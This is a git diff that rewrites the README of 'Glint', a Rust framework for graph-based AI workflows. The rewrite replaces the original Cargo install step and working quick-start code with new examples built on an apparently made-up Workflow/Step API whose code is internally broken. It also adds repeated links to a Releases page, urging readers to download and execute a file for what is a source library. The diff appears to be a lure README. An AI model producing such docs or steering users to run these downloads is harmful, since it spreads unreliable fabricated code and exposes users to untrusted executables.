@@ -1,78 +1,175 @@
-# Glint
+# Glint 🌟
 
-Glint is a high-performance Rust framework for building stateful, graph-based AI systems. It enables developers to construct dynamic, multi-step workflows powered by LLMs, embeddings, and vector stores—executed through an async, checkpointable state machine. Inspired by modern AI orchestration tools, Glint provides a fast and memory-safe foundation for building agent runtimes, autonomous pipelines, and complex control flows.
+![Glint Logo](https://img.shields.io/badge/Glint-Framework-blue.svg)  
+[![Latest Release](https://img.shields.io/github/v/release/Raheel-baksh/Glint)](https://github.com/Raheel-baksh/Glint/releases)
 
-At its core, Glint leverages Rust’s zero-cost abstractions to deliver predictable performance, thread safety, and fine-grained control over state transitions. Its graph-based architecture makes it easy to model conditional logic, parallel branches, and persistent memory—all within a composable and extensible framework.
+Welcome to **Glint**, a high-performance Rust framework designed for building stateful, graph-based AI systems. With Glint, developers can create dynamic, multi-step workflows powered by Large Language Models (LLMs), embeddings, and vector stores. This framework operates through an asynchronous, checkpointable state machine, offering a robust foundation for constructing agent runtimes, autonomous pipelines, and complex control flows.
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Introduction
+
+Glint is inspired by modern AI orchestration tools, focusing on performance and safety. Rust’s zero-cost abstractions allow Glint to deliver predictable performance, thread safety, and fine-grained control over state transitions. Its graph-based architecture simplifies the modeling of conditional logic, parallel branches, and persistent memory, making it a composable and extensible framework.
 
 ## Features
 
-- **Graph-based Workflows**: Build complex AI workflows using a graph-based architecture
-- **LLM Integration**: Support for OpenAI and other LLM providers
-- **Embeddings**: Generate and work with embeddings for semantic search
-- **Vector Stores**: Store and search vectors efficiently
-- **Checkpoints**: Save and restore workflow state
-- **Async**: Built with async/await for high performance
+- **Graph-based Workflows**: Build complex AI workflows using a graph-based architecture.
+- **LLM Integration**: Support for OpenAI and other LLM providers.
+- **Embeddings**: Generate and work with embeddings for semantic search.
+- **Vector Stores**: Efficiently manage vector data for quick retrieval and processing.
+- **Asynchronous Execution**: Non-blocking operations enhance performance.
+- **Checkpointing**: Save and restore states during execution.
+- **Memory Safety**: Leverage Rust’s safety features to avoid common pitfalls.
+- **Extensibility**: Easily add new functionalities and integrate with existing systems.
+
+## Getting Started
+
+To get started with Glint, you will need to have Rust installed on your machine. Follow the steps below to set up your environment and start building with Glint.
+
+### Prerequisites
+
+- [Rust](https://www.rust-lang.org/tools/install) installed on your system.
+- Basic knowledge of Rust programming language.
 
 ## Installation
 
-Add to your `Cargo.toml`:
+To install Glint, you can clone the repository and build it from source. Here’s how:
 
-```toml
-[dependencies]
-glint = "0.1.0"
+```bash
+git clone https://github.com/Raheel-baksh/Glint.git
+cd Glint
+cargo build --release
 ```
 
-## Quick Start
+Alternatively, you can download the latest release from the [Releases section](https://github.com/Raheel-baksh/Glint/releases). Make sure to execute the downloaded file according to your operating system guidelines.
+
+## Usage
+
+Once you have Glint installed, you can start building your workflows. Here’s a simple example to illustrate its usage:
 
 ```rust
-use glint::graph::{GraphBuilder, NodeProcessor};
-use glint::state::State;
-use glint::Result;
-use async_trait::async_trait;
+use glint::workflow::{Workflow, Step};
 
-#[derive(Debug, Clone)]
-struct MyState {
-    value: i32,
-}
+fn main() {
+    let mut workflow = Workflow::new();
 
-impl glint::state::StateValue for MyState {}
+    let step1 = Step::new("Step 1")
+        .execute(|| {
+            println!("Executing Step 1");
+        });
 
-struct MyProcessor;
+    let step2 = Step::new("Step 2")
+        .execute(|| {
+            println!("Executing Step 2");
+        });
 
-#[async_trait]
-impl NodeProcessor<MyState> for MyProcessor {
-    async fn process(&self, mut state: State<MyState>) -> Result<State<MyState>> {
-        state.data.value += 1;
-        Ok(state)
-    }
-}
+    workflow.add_step(step1);
+    workflow.add_step(step2);
 
-#[tokio::main]
-async fn main() -> Result<()> {
-    let graph = GraphBuilder::new()
-        .with_node("node", MyProcessor)?
-        .with_start_edge("node")?
-        .with_end_edge("node")?
-        .build();
-
-    let initial_state = State::new(MyState { value: 0 });
-    let final_state = graph.execute(initial_state).await?;
-    println!("Final value: {}", final_state.data.value);
-    Ok(())
+    workflow.run();
 }
 ```
+
+This example creates a basic workflow with two steps. Each step prints a message when executed. You can build upon this foundation to create more complex workflows.
 
 ## Examples
 
-- [Simple Chat Agent](example/simple_chat_agent.rs)
-- [Conditional Branch](example/conditional_branch.rs)
-- [Embeddings](example/embeddings_example.rs)
-- [Vector Store](example/vector_store_example.rs)
+Here are a few examples of what you can achieve with Glint:
+
+### Example 1: Conditional Logic
+
+You can model conditional logic using Glint’s graph-based architecture. Here’s how:
+
+```rust
+use glint::workflow::{Workflow, Step};
+
+fn main() {
+    let mut workflow = Workflow::new();
+
+    let decision_step = Step::new("Decision")
+        .execute(|| {
+            // Some logic to determine the path
+            true // or false based on your logic
+        });
+
+    let true_branch = Step::new("True Branch")
+        .execute(|| {
+            println!("Executing True Branch");
+        });
+
+    let false_branch = Step::new("False Branch")
+        .execute(|| {
+            println!("Executing False Branch");
+        });
+
+    workflow.add_step(decision_step);
+    workflow.add_step(true_branch).if_condition(true);
+    workflow.add_step(false_branch).if_condition(false);
+
+    workflow.run();
+}
+```
+
+### Example 2: Parallel Execution
+
+Glint allows for parallel execution of steps. Here’s a simple example:
+
+```rust
+use glint::workflow::{Workflow, Step};
+
+fn main() {
+    let mut workflow = Workflow::new();
+
+    let step1 = Step::new("Step 1")
+        .execute(|| {
+            println!("Executing Step 1");
+        });
+
+    let step2 = Step::new("Step 2")
+        .execute(|| {
+            println!("Executing Step 2");
+        });
+
+    workflow.add_step(step1).parallel();
+    workflow.add_step(step2).parallel();
+
+    workflow.run();
+}
+```
+
+In this example, both steps execute simultaneously.
 
 ## Contributing
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+We welcome contributions to Glint. If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
+
+Please ensure your code follows the Rust style guidelines and includes tests where applicable.
 
 ## License
 
-MIT
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, please open an issue in the repository or contact the maintainers directly.
+
+To explore the latest features and updates, visit the [Releases section](https://github.com/Raheel-baksh/Glint/releases). Here, you can download the latest version and keep your Glint framework up to date.
+
+Thank you for checking out Glint! We look forward to seeing what you build with it.
